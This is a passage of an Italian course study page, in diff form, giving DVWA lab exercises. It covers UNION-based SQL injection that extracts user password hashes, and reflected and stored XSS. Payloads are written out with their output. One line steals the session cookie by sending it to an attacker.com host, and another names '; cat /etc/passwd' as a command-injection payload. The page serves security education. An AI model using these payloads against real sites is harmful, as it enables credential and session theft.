+         → @@version dice il DBMS (MySQL/MariaDB/PostgreSQL hanno sintassi diverse)
+         → database() dice il nome del DB corrente (quello da attaccare)
+         ↓
+Passo 3a: quali tabelle esistono in quel DB?
+          → information_schema.tables filtrato per table_schema='dvwa'
+          ↓
+Passo 3b: quali colonne ha la tabella 'users'?
+          → information_schema.columns filtrato per table_name='users'
+          ↓
+Passo 4: estrai i dati reali con i nomi esatti trovati al passo 3b
+         → SELECT user,password FROM users
+</code></pre>
+<p>Non puoi saltare passi: senza il numero di colonne la UNION dà errore; senza i nomi delle tabelle non sai cosa selezionare; senza i nomi delle colonne non sai quali campi estrarre.</p>
+<p><strong>Comandi</strong>:</p>
+<p>Step 1 — Scopri il numero di colonne (prova finché non dà errore):</p>
+<pre><code class="language-sql">' union select NULL #
+</code></pre>
+<p>→ errore "The used SELECT statements have a different number of columns"</p>
+<pre><code class="language-sql">' union select NULL,NULL #
+</code></pre>
+<p>→ riga vuota restituita: <strong>2 colonne</strong> ✅</p>
+<p>Step 2 — Metadati del server (sai il DBMS e il DB target):</p>
+<pre><code class="language-sql">' union select NULL,@@version #
+</code></pre>
+<blockquote>
+<p><code>Surname: 10.1.26-MariaDB-0+deb9u1</code> — MariaDB su Debian 9. Confermato MySQL-compatibile → <code>information_schema</code> disponibile.</p>
+</blockquote>
+<pre><code class="language-sql">' union select NULL,@@hostname #
+</code></pre>
+<blockquote>
+<p><code>Surname: a6cabeb4862c</code> — hostname del container Docker.</p>
+</blockquote>
+<pre><code class="language-sql">' union select NULL,database() #
+</code></pre>
+<blockquote>
+<p><code>Surname: dvwa</code> — DB attivo: <code>dvwa</code>. Questo è il nome da usare nel filtro <code>table_schema=</code> al passo successivo.</p>
+</blockquote>
+<p>Step 3 — Mappa la struttura (prima i DB, poi le tabelle, poi le colonne):</p>
+<pre><code class="language-sql">' union select null,schema_name from information_schema.schemata #
+</code></pre>
+<blockquote>
+<p>DB presenti: <code>dvwa</code>, <code>information_schema</code> — container minimale, nessun DB di sistema aggiuntivo.</p>
+</blockquote>
+<pre><code class="language-sql">' union select null,table_name from information_schema.tables where table_schema='dvwa' #
+</code></pre>
+<blockquote>
+<p>Tabelle in <code>dvwa</code>: <code>guestbook</code>, <code>users</code> — ci interessa <code>users</code>.</p>
+</blockquote>
+<pre><code class="language-sql">' union select null,column_name from information_schema.columns where table_name='users' #
+</code></pre>
+<blockquote>
+<p>Colonne di <code>users</code>: <code>user_id</code>, <code>first_name</code>, <code>last_name</code>, <code>user</code>, <code>password</code>, <code>avatar</code>, <code>last_login</code>, <code>failed_login</code>.
+Le colonne utili sono <code>user</code> e <code>password</code> — nomi esatti da usare nel passo 4.</p>
+</blockquote>
+<p>Step 4 — Estrai le credenziali con i nomi trovati al passo 3:</p>
+<pre><code class="language-sql">' union select user,password from users #
+</code></pre>
+<p><strong>Output ottenuto</strong>:</p>
+<pre><code>admin    5f4dcc3b5aa765d61d8327deb882cf99
+gordonb  e99a18c428cb38d5f260853678922e03
+1337     8d3533d75ae2c3966d7e0d4fcc69216b
+pablo    0d107d09f5bbe40cade3de5c71e9e9b7
+smithy   5f4dcc3b5aa765d61d8327deb882cf99
+</code></pre>
+<p><code>5f4dcc3b5aa765d61d8327deb882cf99</code> = MD5 di "password" (admin e smithy hanno la stessa password). Hash MD5 senza salt — cercabile su qualsiasi rainbow table online.</p>
+<p><strong>Anatomia dei payload</strong>:
+- <code>'</code> iniziale — chiude la stringa del parametro aperta dal PHP (<code>WHERE user_id = '</code>). Senza questo l'input viene trattato come valore letterale, non come SQL.
+- <code>UNION SELECT</code> — concatena una seconda query. I risultati appaiono nelle stesse colonne della query originale (First name / Surname).
+- <code>NULL</code> — placeholder neutro compatibile con qualsiasi tipo di colonna. Serve per trovare il numero di colonne senza sapere i tipi.
+- <code>#</code> — commenta il <code>'</code> finale che il PHP aggiunge dopo il parametro, altrimenti la query avrebbe un apostrofo spaiato → errore di sintassi SQL.
+- <code>@@version</code> / <code>@@hostname</code> / <code>database()</code> — variabili e funzioni MySQL che restituiscono metadati del server senza toccare tabelle utente.
+- <code>information_schema</code> — DB di sistema MySQL/MariaDB sempre presente, contiene la mappa dell'intera struttura. <code>.schemata</code> = lista DB; <code>.tables</code> = lista tabelle; <code>.columns</code> = lista colonne. È la stessa "mappa" usata da ogni tool di SQLi automatico (sqlmap, ecc.).</p>
+<p>⚠️ <strong>information_schema è specifico di MySQL/MariaDB</strong>. Per PostgreSQL: <code>pg_catalog</code>; per SQLite: <code>sqlite_master</code>. Ecco perché il passo 2 (identificare il DBMS con <code>@@version</code>) viene prima della mappatura.</p>
+<p><strong>Cosa verificare</strong>: username + hash MD5 di tutti gli utenti DVWA estratti. <code>5f4dcc3b5aa765d61d8327deb882cf99</code> cercato online → "password". Hash senza salt = A2 (Cryptographic Failures).</p>
+<hr />
+<h3 id="esercizio-8-xss-reflected">Esercizio 8 — XSS Reflected</h3>
+<p><strong>Obiettivo</strong>: iniettare JavaScript nel form "XSS Reflected" di DVWA e vedere il codice eseguire nel browser.</p>
+<p><strong>Concetto</strong>: il server echeggia l'input nella pagina HTML senza encoding. Il browser interpreta <code>&lt;script&gt;</code> come JavaScript ed esegue il codice. In un attacco reale l'attaccante costruisce una URL con il payload nel parametro GET e la invia alla vittima — quando la vittima clicca, il suo browser esegue il codice JS nel contesto del sito fidato (che ha il suo cookie di sessione).</p>
+<p><strong>Comandi</strong>:</p>
+<pre><code class="language-html">&lt;!-- DVWA → XSS (Reflected), campo &quot;What's your name?&quot; --&gt;
+
+&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;
+
+&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+</code></pre>
+<p><strong>Anatomia dei payload</strong>:
+- <code>&lt;script&gt;alert("XSS")&lt;/script&gt;</code> — tag script HTML: il browser lo interpreta come JavaScript. <code>alert()</code> è la proof-of-concept classica — se appare il popup, il codice è eseguito. Il server ha echeggiato l'input senza HTML-encoding (<code>&amp;lt;</code> per <code>&lt;</code>).
+- <code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code> — <code>document.cookie</code> è una proprietà del DOM che contiene tutti i cookie del dominio corrente, incluso il PHPSESSID. Se appare il cookie nel popup, un attaccante potrebbe esfiltrarla inviandola al suo server invece di chiamare <code>alert()</code>.
+- In attacco reale la URL sarebbe: <code>?name=&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code> — la vittima (già loggata su DVWA) viene portata a cliccare questa URL; il suo browser autentico esegue il codice JS nel contesto di DVWA, che ha accesso al suo PHPSESSID.</p>
+<p><strong>Output ottenuto</strong>: popup con testo "XSS" (primo payload) e popup con il PHPSESSID attivo (secondo payload). ✅</p>
+<p><strong>Cosa verificare</strong>: il popup appare — XSS confermato. Il sito non fa HTML-encoding dell'input prima di echeggiarlo nella risposta.</p>
+<hr />
+<h3 id="esercizio-9-xss-stored">Esercizio 9 — XSS Stored</h3>
+<p><strong>Obiettivo</strong>: iniettare JavaScript nella sezione "Stored XSS" di DVWA in modo che il payload rimanga nel DB ed esegua automaticamente per ogni visitatore.</p>
+<p><strong>Concetto</strong>: a differenza del Reflected (richiede che la vittima clicchi una URL specifica), lo Stored XSS persiste nel database del server. Ogni utente che carica la pagina esegue il codice malevolo senza alcuna interazione richiesta — è più pericoloso. Il vettore tipico sono forum, campi commento, guestbook.</p>
+<p><strong>Comandi</strong>:</p>
+<pre><code class="language-html">&lt;!-- DVWA → XSS (Stored) --&gt;
+&lt;!-- Compila il form guestbook: --&gt;
+&lt;!-- Name: test --&gt;
+&lt;!-- Message: &lt;script&gt;alert(&quot;XSS stored&quot;)&lt;/script&gt; --&gt;
+&lt;!-- Clicca &quot;Sign Guestbook&quot; --&gt;
+</code></pre>
+<p>Per mostrare il cookie di sessione a ogni visitatore:</p>
+<pre><code class="language-html">&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+</code></pre>
+<p><strong>Anatomia del payload</strong>:
+- Lo stesso <code>&lt;script&gt;alert()&lt;/script&gt;</code> viene inserito nel campo message del guestbook. Il server salva il payload nel DB senza sanitizzarlo. Ogni volta che qualsiasi utente carica la pagina del guestbook, il payload viene echeggiato dall'HTML e il browser lo esegue.
+- <strong>Differenza critica con Reflected</strong>: nel Reflected il payload è nell'URL e richiede social engineering per far cliccare la vittima; nello Stored è nel DB e colpisce automaticamente tutti i visitatori successivi — zero interazione.
+- In un attacco reale il payload esiltra il cookie su un server dell'attaccante: <code>&lt;script&gt;document.location='http://attacker.com/steal?c='+document.cookie&lt;/script&gt;</code>.</p>
+<p><strong>Output ottenuto</strong>: popup al submit; ricaricando la pagina il popup riappare senza reinserire nulla — payload persistente nel DB. ✅</p>
+<p><strong>Cosa verificare</strong>: ricarica la pagina → il popup riappare. Questo dimostra la persistenza: chiunque carichi questa pagina esegue il JS.</p>
+<hr />
+<h2 id="connessioni">Connessioni</h2>
+<ul>
+<li><strong>Con S1 (enumerazione)</strong>: <code>nmap</code> e <code>gobuster</code> di questo lab sono le stesse tecniche di S1 riapplicate a web app. La diferenza: qui la discovery porta a vulnerabilità applicative invece che a mappa di rete.</li>
+<li><strong>Con S2 (autenticazione)</strong>: il brute force (Es.3) dimostra perché rate limiting e lockout sono fondamentali. XSS con <code>document.cookie</code> (Es.8-9) dimostra il furto di sessione — esattamente il rischio che i session token sicuri di S2 cercano di mitigare.</li>
+<li><strong>Con S5 (firewall)</strong>: Command Injection (Es.5) dà RCE come www-data. Le regole iptables in uscita limitano il blast radius bloccando reverse shell e connessioni verso la rete interna (SSRF).</li>
+<li><strong>Con S10 (Suricata)</strong>: i payload <code>' union select</code>, <code>; cat /etc/passwd</code>, <code>&lt;script&gt;alert</code> generano pattern rilevabili nel traffico HTTP — Suricata può matchare questi signature nelle request web.</li>
+</ul>
+<hr />
+<h2 id="famiglia-desame">Famiglia d'esame</h2>
+<p>Tipologia: <strong>Web vulnerabilities</strong> ⭐
+Prova passata correlata: <code>SIMULAZIONI ESAMI/SICINF/&lt;file_web_vulnerabilities&gt;</code> — eseguila al termine del lab.</p>
+<hr />
+<!-- AUTO-LINKS -->
+
+<!-- AUTO-LINKS:START -->
+<h2 id="collegati">🔗 Collegati</h2>
+<ul>
+<li>[[appunti_moduloS3_web_security]]</li>
+<li>[[lezione_moduloS3_web_security]]</li>
+</ul>
+<p><strong>Hub:</strong> [[master_map_studio]] · [[concept_maps]] · [[metodo_studio_esami_pratici]]</p>
+<!-- AUTO-LINKS:END --></article>
+</main>
+
+<footer class="pieDiPagina">
+  <p>Generato il 2026-09-02 16:48 da <code>scripts/build_ui.py</code>. Sola lettura.</p>
+</footer>
+
+<dialog class="ricerca" id="ricerca">
+  <input type="search" id="ricerca-campo" placeholder="Cerca in tutto il cockpit…" autocomplete="off">
+  <ul id="ricerca-esiti"></ul>
+</dialog>
+
+<script>window.RADICE = "../";</script>
+<script src="../assets/indice.js"></script>
+<script src="../assets/app.js"></script>
+</body>
+</html>
